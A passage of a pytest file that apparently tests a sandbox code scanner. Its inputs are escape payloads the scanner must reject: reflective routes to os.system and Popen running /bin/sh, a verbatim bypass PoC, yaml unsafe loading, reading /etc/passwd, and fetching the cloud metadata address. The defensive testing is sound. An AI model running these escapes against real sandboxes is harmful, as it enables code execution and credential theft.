                "import pathlib\nclass Holder:\n    module = pathlib\n"
                "    def run(self):\n        self.module.os.fork()",
                id="class-attribute",
            ),
            pytest.param(
                "import glob\nmodule = [glob][0]\nmodule.os.spawnve()",
                id="container-alias",
            ),
            pytest.param(
                "import pathlib\ndef expose():\n    return pathlib\nexpose().os.posix_spawnp()",
                id="returned-module",
            ),
            pytest.param(
                "import pathlib\ndef consume(mapping):\n    return mapping['os']\nconsume(vars(pathlib)).system('id')",
                id="module-dict-as-argument",
            ),
        ],
    )
    def test_should_reject_os_reexport_hosts_across_opaque_boundaries(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import pathlib\ndef invoke(capability):\n    return capability('os')\n"
                "invoke(pathlib.__getattribute__).system('id')",
                id="helper-argument",
            ),
            pytest.param(
                "import glob\ndef invoke(capability=glob.__dict__.get):\n    return capability('os')\n"
                "invoke().spawnv()",
                id="function-default",
            ),
            pytest.param(
                "import pathlib\ndef expose():\n    return pathlib.__dict__.__getitem__\nexpose()('os').fork()",
                id="returned-capability",
            ),
            pytest.param(
                "import glob\nclass Holder:\n    reflect = glob.__getattribute__\nHolder().reflect('os').spawnve()",
                id="class-attribute",
            ),
            pytest.param(
                "import pathlib\ncapabilities = [pathlib.__dict__.get]\ncapabilities[0]('os').system('id')",
                id="container",
            ),
        ],
    )
    def test_should_reject_reflective_capabilities_crossing_opaque_boundaries(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import pathlib\npathlib.__getattribute__.__call__('os').system('id')",
                id="module-getattribute-call",
            ),
            pytest.param(
                "import glob\nglob.__dict__.get.__call__('os').spawnv()",
                id="mapping-get-call",
            ),
            pytest.param(
                "import pathlib\nreflect = pathlib.__dict__.__getitem__.__call__\nreflect('os').forkpty()",
                id="aliased-mapping-getitem-call",
            ),
        ],
    )
    def test_should_detect_normalized_reflective_call_variants(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param("import pathlib\npathlib.__dict__.pop('os').system('id')", id="mapping-pop"),
            pytest.param("import glob\nglob.__dict__.copy()['os'].spawnv()", id="mapping-copy"),
            pytest.param(
                "import pathlib\noperation = pathlib.__dict__.setdefault\noperation('os').fork()",
                id="aliased-mapping-operation",
            ),
        ],
    )
    def test_should_reject_unmodeled_restricted_mapping_operations(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import os\nclass Safe:\n    def system(self, value):\n        return value\n"
                "class Manager:\n    def __enter__(self):\n        return Safe()\n"
                "    def __exit__(self, *args):\n        return None\n"
                "with Manager() as os:\n    os.system('ordinary object')",
                id="with-name-shadow",
            ),
            pytest.param(
                "from os import *\nclass Manager:\n    def __enter__(self):\n        return lambda value: value\n"
                "    def __exit__(self, *args):\n        return None\n"
                "with Manager() as write:\n    write('ok')\nwrite('still shadowed')",
                id="with-wildcard-name-shadow",
            ),
        ],
    )
    def test_should_allow_with_targets_to_shadow_restricted_names(self, code):
        assert scan_code_security(code).is_safe is True


class TestScanCodeSecurityStdlibReexportBypass:
    """Stdlib modules re-exporting os/sys/__builtins__ must not bypass the scan.

    Regression tests for H1-3991551: ``platform`` (and any other stdlib module
    with a module-level ``import os`` / ``import sys``) re-exports the real
    restricted modules, and every imported module's ``__dict__`` carries
    ``__builtins__``.
    """

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param("import platform\nplatform.os.system('id')", id="platform-os-call"),
            pytest.param("import platform\nsecret = platform.os.environ", id="platform-os-read"),
            pytest.param(
                "import platform\nplatform.sys.modules['subprocess'].Popen(['id'])", id="platform-sys-modules"
            ),
            pytest.param("import platform\ngetattr(platform, 'o' + 's').spawnv()", id="platform-reflective-os"),
            pytest.param("from platform import os\nos.system('id')", id="from-platform-import-os"),
            pytest.param(
                "from platform import sys as runtime\nruntime.modules['os'].fork()", id="from-platform-import-sys"
            ),
            pytest.param("import zipfile\nzipfile.os.system('id')", id="zipfile-os-call"),
            pytest.param("import tarfile\ntarfile.sys.modules['os'].posix_spawn()", id="tarfile-sys-modules"),
            pytest.param("import zipfile\nzipfile.__dict__['os'].spawnv()", id="zipfile-dict-os"),
            pytest.param("import tarfile\nvars(tarfile).get('os').fork()", id="tarfile-vars-get-os"),
        ],
    )
    def test_should_detect_stdlib_module_reexports(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import platform\nplatform.__dict__['__builtins__']['eval']('1')", id="platform-dict-builtins"
            ),
            pytest.param(
                "import platform\nvars(platform)['__builtins__']['__import__']('os').system('id')",
                id="platform-vars-builtins",
            ),
            pytest.param(
                "import platform\ngetattr(platform, '__dict__')['__builtins__']['eval']('1')",
                id="getattr-dict-builtins",
            ),
            pytest.param("import zipfile\nzipfile.__dict__['__builtins__']['eval']('1')", id="zipfile-dict-builtins"),
            pytest.param(
                "import requests\nrequests.__dict__['__builtins__']['eval']('1')", id="third-party-dict-builtins"
            ),
            pytest.param(
                "import requests\nrequests.__dict__.get('__builtins__')['eval']('1')",
                id="third-party-dict-get-builtins",
            ),
            pytest.param(
                "import requests\nrequests.__dict__.__getitem__('__builtins__')['eval']('1')",
                id="third-party-dict-getitem-builtins",
            ),
            pytest.param(
                "import requests\ndict.get(requests.__dict__, '__builtins__')['eval']('1')",
                id="third-party-dict-get-unbound-builtins",
            ),
            pytest.param(
                "import requests\ndict.__getitem__(requests.__dict__, '__builtins__')['eval']('1')",
                id="third-party-dict-getitem-unbound-builtins",
            ),
            pytest.param(
                "import platform\nplatform.__dict__.get('__builtins__')['eval']('1')", id="platform-dict-get-builtins"
            ),
            pytest.param(
                "import zipfile\nzipfile.__dict__.__getitem__('__builtins__')['eval']('1')",
                id="zipfile-dict-getitem-builtins",
            ),
            pytest.param(
                "import zipfile\ndict.get(zipfile.__dict__, '__builtins__')['eval']('1')",
                id="zipfile-dict-get-unbound-builtins",
            ),
            pytest.param(
                "import requests\nrequests.__dict__.get('__builtins__', {})['eval']('1')",
                id="third-party-dict-get-default-builtins",
            ),
            pytest.param(
                "import zipfile\nzipfile.__dict__['__loader__'].load_module('os').system('id')",
                id="zipfile-dict-loader",
            ),
        ],
    )
    def test_should_detect_builtins_reflection_through_module_dict(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import platform\ndef expose():\n    return platform\nexpose().os.system('id')",
                id="returned-platform",
            ),
            pytest.param(
                "import platform\nname = 'o' + 's'\nplatform.__dict__[name].system('id')",
                id="platform-dict-dynamic-key",
            ),
        ],
    )
    def test_should_treat_platform_as_restricted_module(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import platform\nname = platform.system()\nrelease = platform.release()", id="platform-safe-api"
            ),
            pytest.param('import json\ndata = json.loads(\'{"key": "value"}\')', id="json-loads"),
            # ``vars(<host>)`` resolves to the same mapping as ``<host>.__dict__``;
            # a safe member read through it stays allowed.
            pytest.param("import glob\ncheck = vars(glob)['magic_check']", id="vars-safe-member"),
            pytest.param(
                "import example_module\nexample_module.os.system('ordinary object')",
                id="unknown-module-os-attribute",
            ),
            pytest.param("from example_module import os\nos.system('ordinary object')", id="unknown-module-import-os"),
        ],
    )
    def test_should_allow_safe_stdlib_and_object_access(self, code):
        assert scan_code_security(code).is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import glob\nfiles = glob.glob('*.txt')\npath_class = glob.__dict__['magic_check']",
                id="glob-dict-safe-member",
            ),
            pytest.param(
                "import requests\nsession_class = requests.__dict__.get('Session')",
                id="third-party-dict-get-safe-member",
            ),
        ],
    )
    def test_should_detect_dunder_mapping_access_on_safe_hosts(self, code):
        # Reading ``__dict__`` is itself a blocked dunder access (H1-3977745),
        # so the safe-host carve-outs above no longer extend to the mapping
        # spelling — even for a safe member or an ordinary object. ``vars(x)``
        # reaches the same mapping and stays allowed.
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("sandbox escape" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "class Record:\n    value = 1\nobj = Record()\nkey = 'value'\nresult = obj.__dict__[key]",
                id="ordinary-object-dict-dynamic",
            ),
            pytest.param(
                "import requests\nname = 'Ses' + 'sion'\nsession_class = requests.__dict__.get(name)",
                id="third-party-dict-get-dynamic-safe",
            ),
            # Cost of the receiver-independent static-dunder rule: a plain
            # dictionary that happens to use a dunder string as a key is
            # rejected too, because the receiver is not consulted.
            pytest.param("data = {'__builtins__': 'text'}\nvalue = data['__builtins__']", id="plain-dict-dunder-key"),
        ],
    )
    def test_should_detect_namespace_mapping_reads_on_safe_hosts(self, code):
        # A ``__dict__`` mapping is a namespace whoever owns it, so a key this
        # scanner cannot resolve fails closed even on a safe host (H1-3989735).
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("sandbox escape" in violation for violation in result.violations)


class TestScanCodeSecurityDottedSubmoduleAccess:
    """Bare-package imports must not reach a blocked submodule via dotted access.

    A bare ``import urllib`` / ``import http`` is allowed (the package root is
    safe), but at runtime ``urllib.request`` / ``http.client`` are already
    preloaded, so ``urllib.request.urlopen(...)`` works without an explicit
    submodule import. The scanner flags the dotted access itself. Safe siblings
    (``urllib.parse``, ``http.HTTPStatus``, ``os.path``) stay allowed.
    """

    def test_should_detect_bare_urllib_then_request_call(self):
        code = "import urllib\nurllib.request.urlopen('http://169.254.169.254/latest/meta-data/')"
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("urllib.request" in v for v in result.violations)

    def test_should_detect_bare_http_then_client(self):
        code = "import http\nc = http.client.HTTPConnection('attacker', 80)"
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("http.client" in v for v in result.violations)

    def test_should_detect_urllib_request_access_without_import(self):
        """Relying on the runtime preload — no import statement at all."""
        result = scan_code_security("urllib.request.urlopen('http://x')")
        assert result.is_safe is False

    def test_should_detect_aliased_bare_urllib_submodule(self):
        result = scan_code_security("import urllib as u\nu.request.urlopen('http://x')")
        assert result.is_safe is False

    def test_should_detect_submodule_assignment(self):
        """Binding the submodule object is just as dangerous as calling through it."""
        result = scan_code_security("import urllib\nreq = urllib.request")
        assert result.is_safe is False

    def test_should_report_single_violation_for_chain(self):
        """One dotted chain → exactly one submodule violation (no double-flag)."""
        result = scan_code_security("import urllib\nurllib.request.urlopen('http://x')")
        submod_hits = [v for v in result.violations if "urllib.request" in v]
        assert len(submod_hits) == 1

    # --- no-regression: safe dotted access on mixed packages ---

    def test_should_allow_urllib_parse_dotted_access(self):
        result = scan_code_security("import urllib.parse\nq = urllib.parse.urlencode({'a': 1})")
        assert result.is_safe is True

    def test_should_allow_http_httpstatus_dotted_access(self):
        result = scan_code_security("import http\nx = http.HTTPStatus.OK")
        assert result.is_safe is True

    def test_should_allow_os_path_dotted_access(self):
        result = scan_code_security("import os\np = os.path.join('a', 'b')")
        assert result.is_safe is True


class TestScanCodeSecurityEscapingBindingBypass:
    """Name bindings that outlive the scanner's scope must be checked at the assignment.

    Alias tracking normally defers the check to the use site: ``module = os`` is
    fine because ``module.system(...)`` is still resolvable. That deferral is only
    sound while the binding stays visible to the scanner. Two bindings escape it:

    * a class body binds a *class attribute*, later read as ``self.x`` / ``Cls.x``,
      which alias tracking cannot relate back to the module or callable;
    * ``global`` / ``nonlocal`` publish the binding into a scope the scanner has
      already restored by the time the reader is visited.

    Both must therefore be treated as opaque boundaries at the assignment itself.
    """

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import os\n_os = os\n\n\nclass C:\n    _fn: object = _os.system\n\n"
                "    def run(self):\n        return self._fn('id')\n",
                id="annotated-class-attribute-alias",
            ),
            pytest.param(
                "import os\n_os = os\n\n\nclass C:\n    _fn = _os.system\n\n"
                "    def run(self):\n        return self._fn('id')\n",
                id="plain-class-attribute-alias",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    _fn: object = os.system\n\n"
                "    def run(self):\n        return self._fn('id')\n",
                id="class-attribute-direct-module-member",
            ),
            pytest.param(
                "import os\n_a = os\n_b = _a\n\n\nclass C:\n    _fn = _b.system\n\n"
                "    def run(self):\n        return self._fn('id')\n",
                id="class-attribute-transitive-alias",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    _fn = os.popen\n\n    def run(self):\n        return self._fn('id')\n",
                id="class-attribute-os-popen",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    _mod = os\n\n    def run(self):\n        return self._mod.system('id')\n",
                id="class-attribute-module-object",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    _env = os.environ\n\n"
                "    def run(self):\n        return dict(self._env)\n",
                id="class-attribute-environ-read",
            ),
            pytest.param(
                "class C:\n    _fn = exec\n\n    def run(self):\n        return self._fn('import os')\n",
                id="class-attribute-builtin-exec",
            ),
            pytest.param(
                "class C:\n    _fn = open\n\n    def run(self):\n        return self._fn('/etc/passwd')\n",
                id="class-attribute-builtin-open",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    _a, _b = os.system, os.popen\n",
                id="class-attribute-tuple-unpack",
            ),
            pytest.param(
                "import os\n\n\nclass Outer:\n    class Inner:\n        _fn = os.system\n",
                id="nested-class-attribute",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    _fn = os.system\n\n\nC._fn('id')\n",
                id="class-attribute-read-from-outside",
            ),
            pytest.param(
                "import os\n\n\ndef bind():\n    global _fn\n\n    _fn = os.system\n\n\n"
                "def run():\n    return _fn('id')\n",
                id="global-declared-binding",
            ),
            pytest.param(
                "import os\n\n\ndef outer():\n    _fn = None\n\n    def bind():\n        nonlocal _fn\n\n"
                "        _fn = os.system\n\n    return bind\n",
                id="nonlocal-declared-binding",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    for _fn in (os.system,):\n        pass\n\n"
                "    def run(self):\n        return self._fn('id')\n",
                id="class-body-loop-target",
            ),
            pytest.param(
                "class C:\n    import os as _os\n\n    def run(self):\n        return self._os.system('id')\n",
                id="class-body-import",
            ),
            pytest.param(
                "class C:\n    from os import path as _p\n\n    def run(self):\n        return self._p.os.getcwd()\n",
                id="class-body-from-import-of-os-path",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    _fns = [fn for fn in (os.system,)]\n",
                id="class-body-comprehension",
            ),
            pytest.param(
                "import os\n\nFLAG = True\n\n\nclass C:\n    if FLAG:\n        _fn = os.system\n"
                "    else:\n        _fn = print\n",
                id="class-body-conditional-branch",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    try:\n        _fn = os.system\n"
                "    except Exception:\n        _fn = print\n",
                id="class-body-try-except",
            ),
            pytest.param(
                "import os\n\n\ndef make():\n    class C:\n        _fn = os.system\n\n    return C\n",
                id="class-body-inside-function",
            ),
        ],
    )
    def test_should_detect_escaping_binding_of_dangerous_value(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_report_os_system_for_reported_class_attribute_shape(self):
        code = """
import os

_os = os


class MyComponent:
    _fn: object = _os.system

    def run(self):
        return self._fn("id")
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "from lfx.custom import Component\n"
                "from lfx.io import MessageTextInput, Output\n\n\n"
                "class MyComponent(Component):\n"
                '    display_name = "My Component"\n'
                '    description = "What it does"\n'
                '    icon = "component-icon"\n'
                '    documentation: str = "https://docs.langflow.org"\n'
                '    inputs = [MessageTextInput(name="input_value", display_name="Input")]\n'
                '    outputs = [Output(display_name="Output", name="output", method="process")]\n\n'
                "    def process(self):\n"
                "        return self.input_value\n",
                id="component-shaped-class-body",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    _sep = os.sep\n\n    def run(self):\n        return self._sep\n",
                id="class-attribute-os-sep",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    _join = os.path.join\n\n"
                "    def run(self):\n        return self._join('a', 'b')\n",
                id="class-attribute-os-path-join",
            ),
            pytest.param(
                "import requests\n\n\nclass C:\n    _client = requests\n\n"
                "    def run(self):\n        return self._client.get('https://example.com')\n",
                id="class-attribute-safe-module",
            ),
            pytest.param("def bind():\n    global _count\n\n    _count = 0\n", id="global-constant"),
            pytest.param(
                "import requests\n\n\ndef bind():\n    global _client\n\n    _client = requests\n",
                id="global-safe-module",
            ),
            pytest.param(
                "class C:\n    from os import sep as _sep\n\n    def run(self):\n        return self._sep\n",
                id="class-body-from-import-safe-member",
            ),
            pytest.param(
                "class C:\n    import requests as _requests\n\n"
                "    def run(self):\n        return self._requests.get('https://x')\n",
                id="class-body-import-safe-module",
            ),
            pytest.param("class C:\n    for _n in (1, 2, 3):\n        pass\n", id="class-body-loop-over-constants"),
            pytest.param(
                "def helper(value):\n    return value\n\n\nclass C:\n    _helper = helper\n\n"
                "    def run(self):\n        return self._helper('x')\n",
                id="class-attribute-local-helper",
            ),
            pytest.param(
                "import os\n\n\nclass C:\n    def run(self):\n        module = os\n        module = object()\n"
                "        return module.system('not os')\n",
                id="method-local-alias-stays-deferred",
            ),
        ],
    )
    def test_should_allow_safe_escaping_binding(self, code):
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_still_allow_module_alias_deferred_to_use_site(self):
        """The alias deferral itself must survive: ``module = os`` alone is not a violation."""
        result = scan_code_security("import os\nmodule = os\nmodule = object()\nmodule.system('not os')")
        assert result.is_safe is True


class TestScanCodeSecuritySandboxEscapeBypasses:
    """Regression for H1-3980911 — bypasses of the CVE-2026-33873 remediation.

    Vector A: ``getattr`` with a runtime-built (non-static) attribute name on a
    non-module receiver walked ``().__class__.__bases__[0].__subclasses__()``
    without a single literal dunder, reaching ``subprocess.Popen`` with
    ``is_safe=True``. Dynamic attribute names are now rejected on any receiver.
    Vector B: ``yaml.load(..., Loader=yaml.UnsafeLoader)`` is an arbitrary
    constructor-invocation (deserialization RCE) primitive that was absent from
    every deny-list.
    """

    GETATTR_DYNAMIC_DUNDER_POC = (
        '_c = "".join(["__", "class", "__"])\n'
        '_b = "".join(["__", "bases", "__"])\n'
        '_s = "".join(["__sub", "classes", "__"])\n'
        "base = getattr(getattr((), _c), _b)[0]\n"
        "subs = getattr(base, _s)()\n"
        "for k in subs:\n"
        '    if getattr(k, "".join(["__na", "me__"]), "") == "Popen":\n'
        '        k(["/bin/sh", "-c", "id"])\n'
    )

    def test_should_detect_h1_3980911_getattr_dynamic_dunder_poc(self):
        """The verbatim Vector A PoC must not pass."""
        result = scan_code_security(self.GETATTR_DYNAMIC_DUNDER_POC)
        assert result.is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            # Runtime-built names on a literal-container receiver.
            "subs = getattr((), chr(95) + '__subclasses_')",
            "cls = getattr((), f'__cl{suffix}__')",
            # Runtime-built names on an untracked local receiver.
            "def f(k):\n    return getattr(k, name)",
            # Runtime-built names via an aliased/qualified getattr.
            "reflect = getattr\nsubs = reflect((), name)",
            "import builtins\nsubs = builtins.getattr((), name)",
        ],
        ids=[
            "chr-built-name",
            "fstring-name",
            "untracked-local-receiver",
            "aliased-getattr",
            "builtins-getattr",
        ],
    )
    def test_should_detect_dynamic_getattr_attribute_names(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("Dynamic getattr()" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            "subs = getattr((), '__sub' + 'classes__')",
            # ``str.join`` is resolved statically (#15195), so these spellings
            # land on the dunder guard rather than the dynamic-name rule. Either
            # way the escape is blocked; keep them as regressions for both.
            "subs = getattr((), ''.join(['__sub', 'classes__']))",
            "bases = getattr(getattr((), '__class__'), ''.join(['__ba', 'ses__']))",
        ],
        ids=["concat-name", "join-name", "join-name-nested-receiver"],
    )
    def test_should_detect_statically_assembled_dunder_getattr_name(self, code):
        # Statically resolvable escape names are still caught by the dunder guard.
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("sandbox escape" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            # Static, non-dunder attribute names remain allowed on any receiver.
            "value = getattr(self, 'field', None)",
            "position = getattr((), 'index')",
            "import os\npath_module = getattr(os, 'path')",
        ],
        ids=["static-field-with-default", "static-literal-receiver-attr", "static-module-attr"],
    )
    def test_should_allow_static_getattr_attribute_names(self, code):
        assert scan_code_security(code).is_safe is True

    def test_should_detect_static_benign_dunder_getattr_name(self):
        # ``getattr((), '__len__')`` was allowed as a benign dunder. Every dunder
        # read is now rejected (H1-3977745): a denylist of "dangerous" dunders is
        # bypassable the moment one is missed. Call the builtin instead.
        result = scan_code_security("size = getattr((), '__len__')()")
        assert result.is_safe is False
        assert any("sandbox escape" in violation for violation in result.violations)

    YAML_UNSAFE_LOADER_POC = (
        "import yaml\n"
        "def load_config(untrusted_text):\n"
        "    return yaml.load(untrusted_text, Loader=yaml.UnsafeLoader)\n"
    )

    def test_should_detect_h1_3980911_yaml_unsafe_loader_poc(self):
        """The verbatim Vector B PoC must not pass."""
        result = scan_code_security(self.YAML_UNSAFE_LOADER_POC)
        assert result.is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "import yaml\nyaml.load(text, Loader=yaml.UnsafeLoader)",
            "import yaml\nyaml.load(text, Loader=yaml.Loader)",
            "import yaml\nyaml.load(text, Loader=yaml.FullLoader)",
            "import yaml\nyaml.load(text, Loader=yaml.CLoader)",
            "import yaml\nyaml.load(text, Loader=yaml.CUnsafeLoader)",
            "import yaml\nyaml.load(text, Loader=yaml.CFullLoader)",
            "import yaml\nyaml.unsafe_load(text)",
            "import yaml\nyaml.unsafe_load_all(text)",
            "import yaml\nloader = yaml.UnsafeLoader\nyaml.load(text, Loader=loader)",
            "import yaml\ngetattr(yaml, 'UnsafeLoader')",
            "from yaml import UnsafeLoader",
            "from yaml import Loader",
            "from yaml import unsafe_load\nunsafe_load(text)",
            "from yaml import *\nunsafe_load(text)",
            "import yaml\nyaml.__dict__['UnsafeLoader']",
            "import yaml\nvars(yaml)['Loader']",
            # full_load/full_load_all select FullLoader without naming it, so
            # blocking only the Loader attributes left the wrappers reachable.
            "import yaml\nyaml.full_load(text)",
            "import yaml\nyaml.full_load_all(text)",
            "from yaml import full_load\nfull_load(text)",
            "from yaml import full_load_all\nfull_load_all(text)",
            "from yaml import full_load as fl\nfl(text)",
            "import yaml as y\ny.full_load(text)",
            "import yaml\nloader = yaml.full_load\nloader(text)",
            "import yaml\nyaml.__dict__['full_load'](text)",
            "from yaml import *\nfull_load(text)",
            # yaml re-exports its loaders from these submodules, so the dotted
            # path is the same class object: yaml.loader.FullLoader is
            # yaml.FullLoader.
            "import yaml.loader\nyaml.load(text, yaml.loader.UnsafeLoader)",
            "import yaml.loader\nyaml.load(text, yaml.loader.FullLoader)",
            "import yaml.cyaml\nyaml.load(text, yaml.cyaml.CUnsafeLoader)",
            "import yaml.loader as L\nyaml.load(text, L.UnsafeLoader)",
        ],
        ids=[
            "unsafe-loader-kwarg",
            "loader-kwarg",
            "full-loader-kwarg",
            "c-loader-kwarg",
            "c-unsafe-loader-kwarg",
            "c-full-loader-kwarg",
            "unsafe-load-call",
            "unsafe-load-all-call",
            "aliased-unsafe-loader",
            "getattr-unsafe-loader",
            "from-import-unsafe-loader",
            "from-import-loader",
            "from-import-unsafe-load",
            "wildcard-import-unsafe-load",
            "module-dict-unsafe-loader",
            "vars-loader",
            "full-load-call",
            "full-load-all-call",
            "from-import-full-load",
            "from-import-full-load-all",
            "from-import-full-load-aliased",
            "aliased-module-full-load",
            "assigned-full-load",
            "module-dict-full-load",
            "wildcard-import-full-load",
            "submodule-loader-unsafe-loader",
            "submodule-loader-full-loader",
            "submodule-cyaml-c-unsafe-loader",
            "submodule-loader-aliased",
        ],
    )
    def test_should_detect_yaml_unsafe_deserialization(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "import yaml\nconfig = yaml.safe_load(text)",
            "import yaml\nconfig = yaml.safe_load_all(text)",
            "import yaml\nconfig = yaml.load(text, Loader=yaml.SafeLoader)",
            "import yaml\nconfig = yaml.load(text, yaml.SafeLoader)",
            "from yaml import safe_load\nconfig = safe_load(text)",
            "import yaml\nconfig = yaml.load(text, Loader=yaml.CSafeLoader)",
            # The submodule resolution must not sweep up the safe loaders.
            "import yaml.loader\nconfig = yaml.load(text, yaml.loader.SafeLoader)",
            "import yaml\nconfig = yaml.load(text, yaml.BaseLoader)",
            "import yaml\nout = yaml.dump({'a': 1})",
        ],
        ids=[
            "safe-load",
            "safe-load-all",
            "load-with-safe-loader",
            "load-with-positional-safe-loader",
            "from-import-safe-load",
            "load-with-c-safe-loader",
            "submodule-loader-safe-loader",
            "base-loader",
            "yaml-dump",
        ],
    )
    def test_should_allow_yaml_safe_deserialization(self, code):
        assert scan_code_security(code).is_safe is True


class TestStaticEvaluationBudget:
    """The static string evaluator must not be usable as a memory-exhaustion primitive.

    ``_static_string_value`` exists to recover attribute names like
    ``getattr(io, "op" + "en")``. Resolving ``str.join`` gave it an amplifier: a
    generator repeats its element once per item, so nesting
    ``"".join(<expr> for _ in ("a", "b"))`` doubles the resolved string per level
    while the source grows by a constant. These run *before* the submitted Python
    executes, inside the scan, so an overrun costs a worker its memory.

    Every assertion here uses small configured limits or shallow nesting -- no
    test is allowed to allocate anything large to prove the point.
    """

    @staticmethod
    def _nested_join(levels: int) -> str:
        expr = '"ab"'
        for _ in range(levels):
            expr = f'"".join({expr} for _p in ("x", "y"))'
        return expr

    def test_nested_generator_joins_are_rejected_not_resolved(self):
        node = ast.parse(self._nested_join(20), mode="eval").body
        with pytest.raises(StaticEvaluationBudgetExceededError):
            _static_string_value(node)

    def test_resolved_size_is_bounded_by_the_budget(self):
        """Whatever does resolve stays under the cap; nothing near it is materialized."""
        resolved = _static_string_value(ast.parse(self._nested_join(8), mode="eval").body)
        assert resolved is not None
        assert len(resolved) <= _STATIC_EVAL_MAX_RESOLVED_CHARS

    def test_peak_allocation_does_not_grow_with_nesting(self):
        """30 levels implies a gigabyte unbudgeted; measure instead of assuming."""
        peaks = []
        for levels in (10, 20, 30):
            node = ast.parse(self._nested_join(levels), mode="eval").body
            tracemalloc.start()
            with contextlib.suppress(StaticEvaluationBudgetExceededError):
                _static_string_value(node)
            _, peak = tracemalloc.get_traced_memory()
            tracemalloc.stop()
            peaks.append(peak)
        assert max(peaks) < 4 * _STATIC_EVAL_MAX_RESOLVED_CHARS

    def test_overrun_is_a_violation_not_a_permissive_none(self):
        """The scan must fail closed: None would be read as "dynamic, carry on"."""
        code = f"import io\nx = getattr(io, {self._nested_join(20)})\n"
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("resource exhaustion" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            "import io\nx = getattr(io, ''.join(['Str', 'ingIO']))",
            "import io\nx = getattr(io, 'Str' + 'ingIO')",
            "import io\nx = getattr(io, f'Str{\"ingIO\"}')",
            "import os\nx = getattr(os, '_'.join(['path']))",
            "import io\nx = getattr(io, ''.join(p for p in ('Str', 'ingIO')))",
        ],
        ids=[
            "small-literal-join",
            "small-concat",
            "small-fstring",
            "small-join-with-separator",
            "small-passthrough-generator",
        ],
    )
    def test_ordinary_static_strings_still_resolve(self, code):
        assert scan_code_security(code).is_safe is True

    def test_separator_repetition_is_charged_before_allocating(self):
        """A long separator over many elements is priced from the projection, not after."""
        # Built here rather than written out, so the test source stays small.
        separator = "s" * 4096
        source = f'"{separator}".join(["a", "b", "c", "d", "e", "f", "g", "h"])'
        with pytest.raises(StaticEvaluationBudgetExceededError):
            _static_string_value(ast.parse(source, mode="eval").body)


class TestStdlibReexportHostBoundary:
    """A stdlib module handed across an opaque boundary still carries os/sys.

    ``_reexported_restricted_module`` canonicalizes ``<stdlib>.os`` to the
    real ``os`` for every stdlib host, which is what closes
    ``platform.os.system(...)``. That only runs while the host is a named value,
    so the boundary rule has to cover the same set: passing ``zipfile`` into a
    helper and reading ``m.os`` inside it otherwise reaches ``os`` with the
    scanner unable to relate ``m`` back to a module.
    """

    @pytest.mark.parametrize(
        "code",
        [
            "import zipfile\n\n\ndef helper(m):\n    return m.os.getenv('HOME')\n\n\nvalue = helper(zipfile)",
            "import zipfile\n\n\ndef helper(m):\n    return m.os.system('id')\n\n\nhelper(zipfile)",
            "import zipfile\n\n\ndef give():\n    return zipfile\n\n\nvalue = give().os.getenv('HOME')",
            "import zipfile\n\nmodules = [zipfile]\nvalue = modules[0].os.getenv('HOME')",
            "import zipfile\n\n\nclass C:\n    m = zipfile\n\n\nvalue = C.m.os.getenv('HOME')",
            "import zipfile\n\n\ndef helper(m=zipfile):\n    return m.os.getenv('HOME')\n\n\nvalue = helper()",
            "import zipfile\n\nmapping = {'z': zipfile}\nvalue = mapping['z'].os.getenv('HOME')",
            "import tempfile\n\n\ndef helper(m):\n    return m.os.getenv('HOME')\n\n\nvalue = helper(tempfile)",
        ],
        ids=[
            "carrier-through-argument",
            "carrier-through-argument-os-system",
            "carrier-through-return",
            "carrier-through-list",
            "carrier-through-class-attribute",
            "carrier-through-default-argument",
            "carrier-through-dict-value",
            "carrier-through-argument-tempfile",
        ],
    )
    def test_stdlib_module_cannot_cross_an_opaque_boundary(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            # Ordinary stdlib use is unaffected: only a bare *module value*
            # crossing a boundary is a carrier.
            "import json\nvalue = json.dumps({'a': 1})",
            "import zipfile\narchive = zipfile.ZipFile('x.zip')\nnames = archive.namelist()",
            "import re\nmatch = re.match('a', 'abc')",
            "import math\nvalue = math.sqrt(4)",
